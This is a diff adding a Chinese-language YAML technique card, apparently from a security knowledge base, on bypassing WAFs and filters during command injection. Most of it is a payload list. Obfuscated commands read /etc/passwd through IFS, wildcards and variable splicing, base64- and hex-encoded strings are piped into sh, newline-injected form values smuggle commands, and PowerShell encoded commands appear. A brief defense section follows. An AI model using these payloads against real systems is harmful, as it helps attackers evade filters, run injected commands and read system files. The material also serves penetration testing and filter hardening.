@@ -1,0 +1,82 @@
+# 技术卡片: 命令注入 - WAF/过滤器绕过
+# 分类: cmd-injection / waf-bypass
+# 版本: 1.0
+# 日期: 2026-07-21
+# 来源: SecAtlas KB-CMD-006
+
+id: "cmd-waf-bypass"
+name: "命令注入 WAF/过滤器绕过"
+category: "cmd-injection"
+subcategory: "waf-bypass"
+severity: "high"
+
+description: |
+  WAF 基于字符串匹配拦截命令关键字。利用 shell 灵活性——
+  IFS 替代空格、编码、变量拼接、通配符——构造语义等价但签名不匹配的 payload。
+
+trigger_signals:
+  - "直送命令被 WAF 拦截 (403/406)"
+  - "分号、管道符被过滤"
+  - "空格被过滤"
+  - "命令关键字（whoami/id/cat）被过滤"
+
+bypass_techniques:
+payloads:
+  space_bypass:
+    - "cat${IFS}/etc/passwd"
+    - "cat$IFS$9/etc/passwd"
+    - "{cat,/etc/passwd}"
+    - "cat</etc/passwd"
+    - "X=$'cat\x20/etc/passwd'&&$X"
+
+  slash_bypass:
+    - "cat ${HOME:0:1}etc${HOME:0:1}passwd"
+    - "cat $(echo . | tr '!-~' 'P-~!-O')"
+
+  keyword_bypass:
+    - "whoami → who$()ami → whoa$()mi"
+    - "cat → c${invalid_variable}a${invalid_variable}t"
+    - "whoami → /usr/bin/who*mi"
+    - "cat → /bin/c?t"
+
+  encoding_bypass:
+    - 'echo "Y2F0IC9ldGMvcGFzc3dk" | base64 -d | sh'
+    - "echo 77686f616d69 | xxd -r -p | sh  # hex → whoami"
+    - "$'\\x77\\x68\\x6f\\x61\\x6d\\x69'  # hex escape = whoami"
+
+  variable_concat:
+    - "a=wh;b=oa;c=mi;$a$b$c  # = whoami"
+    - "a=ca;b=t; /$a$b /etc/passwd"
+
+  wildcard:
+    - "/???/???  # = /bin/cat 或类似"
+    - "cat /???/???????  # = cat /etc/passwd"
+    - "/usr/bin/who*mi"
+
+  newline_injection:
+    - "foo%0awhoami  # URL编码换行"
+    - "email=user@x.com%0D%0Aid%0D%0A"
+
+  windows_bypass:
+    - "whoami → WHoAmI  # 大小写混淆"
+    - "whoami → w\"h\"o\"a\"m\"i"
+    - "powershell -EncodedCommand <base64>"
+
+success_indicators:
+  - "混淆 payload 绕过 WAF 且命令执行成功"
+  - "与原始 payload 产生相同副作用"
+  - "响应时间/大小与正常请求不同"
+
+prerequisites:
+  - "命令注入点存在但被 WAF 拦截"
+  - "shell 具有灵活性（bash/sh 扩展）"
+
+defense:
+  - "不应依赖 WAF 签名作为唯一防线"
+  - "根本方案：避免 shell 解释用户输入"
+  - "使用参数化 API（subprocess.run([cmd,arg])）"
+
+sources:
+  - kb: "KB-CMD-006"
+  - ref: "HackTricks: Bypass Linux shells"
+  - ref: "PayloadsAllTheThings: Command Injection"
